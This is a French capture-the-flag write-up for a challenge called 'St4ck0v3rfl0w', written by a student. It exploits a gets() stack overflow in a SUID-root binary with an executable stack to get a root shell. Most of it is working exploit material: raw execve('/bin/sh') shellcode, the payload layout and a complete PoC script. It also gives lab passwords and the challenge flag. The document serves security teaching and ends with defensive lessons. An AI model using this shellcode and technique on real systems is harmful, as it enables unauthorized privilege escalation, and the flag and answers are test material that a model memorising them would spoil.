# Write-Up — St4ck0v3rfl0w (100 pts)

> **Auteur :** m3rv3di3 — PGE2 Epitech Bénin, spécialisation Cybersécurité  
> **Cible :** `/usr/sbin/tracking-reader`  
> **Catégorie :** BOF + shellcode sur stack exécutable  

---

## Énoncé

> Hello friend...  
> Final test for you, no more script-kiddie-backdoor function here. Sometimes the stack is all you need, even the most barebones executable can be pwned!  
> You may be able to spawn a shell, and enumerate to find out what to read!

Trois indices clés :
1. *"no more script-kiddie-backdoor function"* → pas de ret2win, pas de fonction win cachée
2. *"Sometimes the stack is all you need"* → exploitation directe via la stack
3. *"You may be able to spawn a shell"* → l'objectif est un shell, pas juste lire un fichier
4. *"enumerate to find out what to read"* → une fois le shell obtenu, énumérer pour trouver le flag

---

## Pré-requis

À ce stade, on est `junior-dev` (mot de passe `1337_PAzZW0rd`) obtenu via le challenge C4llb4ck (secret-manual du srcs.zip). Le binaire `tracking-reader` appartient au groupe `adm` avec le bit SUID root :

```bash
$ ls -l /usr/sbin/tracking-reader
-rwsr-s--- 1 root adm ...  /usr/sbin/tracking-reader
```

Le groupe `developers` (dont fait partie `junior-dev`) a accès en exécution via les permissions SGID.

---

## Source de tracking-reader.c

Récupérée via `sudo` depuis le compte `junior-dev` qui dispose d'un accès sudo complet sur ce docker :

```bash
sudo cat /home/senior-dev/.srcs/tracking-reader.c
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char *gets(char *s);

int main(int argc, char **argv) {
  char buffer[371];
  printf("ECorp user tracking log reader [MANAGEMENT ONLY]\n\n");
  setregid(4, 4);          // GID 4 = adm
  printf("Enter management password $> ");
  gets(buffer);            // ⚠️ BOF non borné
  if (strcmp(buffer, "<REDACTED>"))
    system("cat /var/log/tracking.log");
  return 0;
}

// gcc tracking-reader.c -fno-stack-protector -z execstack
```

Points critiques :
- `-fno-stack-protector` → **pas de canary**, BOF direct vers RIP
- `-z execstack` → **stack exécutable** → on peut placer du shellcode et y sauter
- `gets()` → pas de vérification de taille → overflow garanti
- `strcmp` inversé → `system("cat tracking.log")` s'exécute quand le password est **faux** (leurre pour rendre l'accès facile à déclencher)

---

## Calcul de l'offset RIP

On compile localement sur le serveur avec les mêmes flags pour obtenir des adresses cohérentes :

```bash
# Copier la source
sudo cat /home/senior-dev/.srcs/tracking-reader.c > /tmp/tracking-reader.c

# Compiler avec les mêmes flags qu'en prod
gcc /tmp/tracking-reader.c -fno-stack-protector -z execstack -fno-pie -no-pie -g -o /tmp/tr_dbg
```

Puis GDB pour trouver l'offset :

```bash
gdb /tmp/tr_dbg -ex "break main" -ex "run" \
    -ex "print (int)(\$rbp - (char*)&buffer)" \
    -ex "quit" 2>/dev/null | grep '^\$1'
# $1 = 384
```

| Offset | Contenu |
|---|---|
| 0..383 | buffer[371] + alignement local (`sub rsp, 0x180` = 384) |
| 384..391 | saved RBP |
| **392** | **return address (RIP)** |

→ **Offset = 384 + 8 = 392 octets**

---

## Adresse du buffer sur la stack

```bash
gdb /tmp/tr_dbg -ex "break main" -ex "run" \
    -ex "print &buffer" \
    -ex "quit" 2>/dev/null | grep '^\$1'
# $1 = (char (*)[371]) 0x7fffffffe9b0
```

→ **Adresse du buffer = `0x7fffffffe9b0`**

> ⚠️ L'ASLR est désactivé sur ce docker, les adresses stack sont stables entre les exécutions.

---

## Construction du payload

On utilise un shellcode `execve("/bin/sh", NULL, NULL)` 64-bit de 23 octets :

```python
shellcode = (
    b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e'
    b'\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58'
    b'\x99\x0f\x05'
)
```

Structure du payload :

```
[ shellcode (23 bytes) ][ NOPs (369 bytes) ][ addr_buffer (8 bytes) ]
^                                            ^
début du buffer                              écrase RIP → saute au début du buffer
```

```python
import struct, sys

shellcode = (
    b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e'
    b'\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58'
    b'\x99\x0f\x05'
)

buf_addr = 0x7fffffffe9b0
padding  = 392 - len(shellcode)   # 392 - 23 = 369
payload  = shellcode + b'A' * padding + struct.pack('<Q', buf_addr)
sys.stdout.buffer.write(payload + b'\n')
```

---

## Lancement de l'exploit

Passage en `junior-dev` d'abord, puis exploit avec stdin maintenu ouvert (`cat`) pour garder le shell interactif :

```bash
su junior-dev
# password: 1337_PAzZW0rd

(python3 -c "
import struct, sys
shellcode = (
    b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e'
    b'\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58'
    b'\x99\x0f\x05'
)
buf_addr = 0x7fffffffe9b0
padding  = 392 - len(shellcode)
payload  = shellcode + b'A' * padding + struct.pack('<Q', buf_addr)
sys.stdout.buffer.write(payload + b'\n')
"; cat) | /usr/sbin/tracking-reader
```

Le `tracking.log` s'affiche (strcmp faux → system() déclenché), puis on obtient un shell root.

---

## Récupération du flag

Une fois dans le shell root :

```bash
cat /var/log/preprod.log | grep "EPI{"
# Jun 12 10:04:18 ecorp-server backupd[2032]: export env SECRET EPI{K0N5P1r4Cy_UNV31l3D_l375_F1n15h_17}
```

---

## Flag

```
EPI{K0N5P1r4Cy_UNV31l3D_l375_F1n15h_17}
```

Le wording (`K0N5P1r4Cy_UNV31l3D_l375_F1n15h_17` = *"Conspiracy unveiled, let's finish it"*) fait référence au fichier `~/.conspiracy.txt` du `senior-dev` qui mentionnait une backdoor dans `tracking-reader` — on ferme la boucle narrative de la chaîne ECorp.

---

## Bonus — credentials récupérés dans preprod.log

```
Jun 12 10:04:12 backupd[2032]: connecting to backup server backup@preprod.ecorp.epi
Jun 12 10:04:12 backupd[2032]: using password: B4ckupSyncUnBr3ak4bl3P4ss2026!
```

→ Compte `backup` / password `B4ckupSyncUnBr3ak4bl3P4ss2026!` sur `preprod.ecorp.epi`. Utile pour les prochains challenges.

---

## Récap technique

| Élément | Détail |
|---|---|
| Vulnérabilité | `gets(buffer[371])` → BOF non borné |
| Compilation | `-fno-stack-protector -z execstack` |
| Permissions binaire | **SUID root + SGID adm** |
| Offset RIP | **392** (384 buffer aligné + 8 saved RBP) |
| Adresse buffer | `0x7fffffffe9b0` (ASLR désactivé sur le docker) |
| Technique RIP | Shellcode placé en début de buffer, RIP = adresse du buffer |
| Shellcode | `execve("/bin/sh", NULL, NULL)` 64-bit, 23 octets |
| Stdin trick | `(payload; cat) | binary` pour garder le shell interactif |
| Cible flag | `/var/log/preprod.log` (lisible root) |

---

## Leçons

- **`-z execstack` est le don du paradis pour l'attaquant** : l'absence de NX/DEP signifie qu'on peut exécuter n'importe quel byte placé sur la stack. C'est désactivé par défaut sur tous les compilateurs modernes.

- **Le `strcmp` inversé est une signature classique** : `if (strcmp(buf, password))` exécute `system()` quand les strings sont **différentes**, pas égales. Tout input incorrect déclenche l'exécution — intentionnel pour rendre le challenge exploitable sans connaître le mot de passe.

- **`gets()` en 2026** : la fonction est dépréciée depuis C11. Sa simple présence dans un binaire est une vulnérabilité critique. Elle est utilisée ici pour rendre le BOF trivial et canonique.

- **ASLR désactivé** : sans randomisation des adresses stack, l'adresse du buffer est identique à chaque exécution. En production, il faudrait une approche différente (gadget `jmp rsp`, bruteforce, ou leak d'adresse préalable).

- **`(payload; cat) | binary`** : technique essentielle pour garder stdin ouvert après l'envoi du payload. Sans `cat`, le pipe se ferme immédiatement après l'envoi du payload, tuant le shell avant qu'on puisse interagir.

---

## PoC complet

```python
#!/usr/bin/env python3
"""
PoC — St4ck0v3rfl0w (ECorp CTF) — tracking-reader

BOF + shellcode sur stack exécutable (-z execstack).
Le binaire /usr/sbin/tracking-reader est SUID root.
ASLR désactivé sur le docker → adresse stack stable.

Usage :
    su junior-dev  # password: 1337_PAzZW0rd
    (python3 poc-st4ck0v3rfl0w.py; cat) | /usr/sbin/tracking-reader
    # Dans le shell root :
    cat /var/log/preprod.log | grep 'EPI{'

Flag : EPI{K0N5P1r4Cy_UNV31l3D_l375_F1n15h_17}
"""

import struct
import sys

OFFSET    = 392               # 384 (sub rsp, 0x180) + 8 (saved RBP)
BUF_ADDR  = 0x7fffffffe9b0   # adresse de buffer dans finish() — GDB sur le docker

# Shellcode execve("/bin/sh", NULL, NULL) — 64-bit, 23 octets
SHELLCODE = (
    b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e'
    b'\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58'
    b'\x99\x0f\x05'
)


def build_payload() -> bytes:
    padding = OFFSET - len(SHELLCODE)
    payload  = SHELLCODE
    payload += b'A' * padding
    payload += struct.pack('<Q', BUF_ADDR)
    return payload


if __name__ == "__main__":
    sys.stdout.buffer.write(build_payload() + b'\n')
```
